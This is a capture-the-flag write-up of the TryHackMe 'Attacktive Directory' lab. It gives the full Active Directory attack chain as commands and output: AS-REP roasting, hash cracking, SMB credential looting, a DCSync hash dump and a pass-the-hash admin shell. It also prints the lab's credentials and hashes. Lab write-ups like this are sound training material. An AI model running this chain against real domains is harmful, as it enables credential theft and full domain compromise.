# Attacktive Directory — TryHackMe — Medium

> **Date:** 2026-06-05 **Platform:** TryHackMe **Difficulty:** Medium **Tags:** #windows #activedirectory #kerberos #asreproasting #dcsync #passthehash #impacket #evil-winrm

---

## Summary

Windows Domain Controller running Active Directory. Initial enumeration revealed the domain `spookysec.local`. AS-REP Roasting against `svc-admin` (Kerberos pre-auth disabled) yielded a crackable TGT hash. Credentials from a backup SMB share allowed a DCSync attack via secretsdump, dumping all NTLM hashes. Administrator access obtained via Pass-the-Hash with evil-winrm.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sV -sC -p- --min-rate 5000 -oN attacktive_nmap.txt 10.130.188.49
```

Open ports:

- 53: DNS — Simple DNS Plus
- 80: HTTP — Microsoft IIS 10.0
- 88: Kerberos → Domain Controller confirmed
- 139/445: SMB
- 389/3268: LDAP — Domain: `spookysec.local`
- 3389: RDP — `AttacktiveDirectory.spookysec.local`
- 5985: WinRM → evil-winrm access possible

Key info extracted:

- Domain: `spookysec.local`
- Hostname: `AttacktiveDirectory.spookysec.local`
- NetBIOS Domain: `THM-AD`
- OS: Windows Server 2019 (build 10.0.17763)

---

## Enumeration

### User Enumeration via AS-REP Roasting

```bash
cd /opt/impacket/examples
python3 GetNPUsers.py spookysec.local/ -dc-ip 10.130.188.49 -no-pass -usersfile /root/userlist.txt 2>/dev/null | grep -v "KDC_ERR"
```

Result: `svc-admin` has Kerberos pre-authentication disabled → TGT hash returned

```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:75691de96a3348cab50691f47fca8c12$...
```

---

## Exploitation

### Hash Cracking — AS-REP (mode 18200)

```bash
hashcat -m 18200 /root/hash.txt /usr/share/wordlists/rockyou.txt --force
```

Result:

```
svc-admin : management2005
```

### SMB Enumeration

```bash
smbclient -L \\\\10.130.188.49 -U spookysec.local/svc-admin%management2005
```

Shares discovered (6 total):

- `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL` — standard
- `backup` — non-standard, accessible

### Backup Share Access

```bash
smbclient \\\\10.130.188.49\\backup -U spookysec.local/svc-admin%management2005
smb: \> get backup_credentials.txt
```

Content:

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoded:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

Result:

```
backup@spookysec.local:backup2517860
```

---

## Privilege Escalation

### DCSync via secretsdump (DRSUAPI method)

The `backup` account holds replication privileges on the DC, allowing a full DCSync attack:

```bash
cd /tmp
python3 /opt/impacket/examples/secretsdump.py -just-dc backup:backup2517860@10.130.188.49
```

Notable hashes extracted:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Notable accounts: `a-spooks` shares the same NTLM hash as `Administrator` → hidden admin account.

### Pass-the-Hash → Domain Admin Shell

```bash
evil-winrm -i 10.130.188.49 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Result: Shell as `Administrator`

---

## Flags

```powershell
type "C:\Users\svc-admin\Desktop\user.txt.txt"
→ `THM{REDACTED}`

type "C:\Users\backup\Desktop\PrivEsc.txt"
→ `THM{REDACTED}`

type "C:\Users\Administrator\Desktop\root.txt"
→ `THM{REDACTED}`
```

---

## Lessons Learned

**1.** Port 88 (Kerberos) open = Domain Controller confirmed — always check for AS-REP Roasting on accounts with pre-auth disabled (`UF_DONT_REQUIRE_PREAUTH`).

**2.** Non-standard SMB shares are always worth enumerating — the `backup` share exposed base64-encoded credentials that unlocked a full DCSync attack.

**3.** The `backup` account had DCSync privileges (DRSUAPI replication rights), allowing a complete dump of NTDS.DIT without ever touching disk on the DC — extremely stealthy in real environments.

**4.** Pass-the-Hash bypasses password requirements entirely — NTLM hashes from secretsdump are enough for full domain access via WinRM, SMB, or PSExec.

**5.** Always look for accounts sharing the same NTLM hash as Administrator — `a-spooks` was a hidden backdoor admin account that would have been missed without the full dump.

---

## Attack Chain Summary

```
nmap → port 88 (Kerberos) → spookysec.local DC
→ GetNPUsers → svc-admin (no pre-auth) → AS-REP hash
→ hashcat -m 18200 → management2005
→ smbclient → backup share → backup_credentials.txt
→ base64 decode → backup:backup2517860
→ secretsdump DRSUAPI → NTDS.DIT dump → Administrator NTLM hash
→ evil-winrm Pass-the-Hash → Domain Admin shell
```

---

## References

- TryHackMe - Attacktive Directory: https://tryhackme.com/room/attacktivedirectory
- HackTricks AS-REP Roasting: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
- HackTricks DCSync: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
- Impacket GitHub: https://github.com/fortra/impacket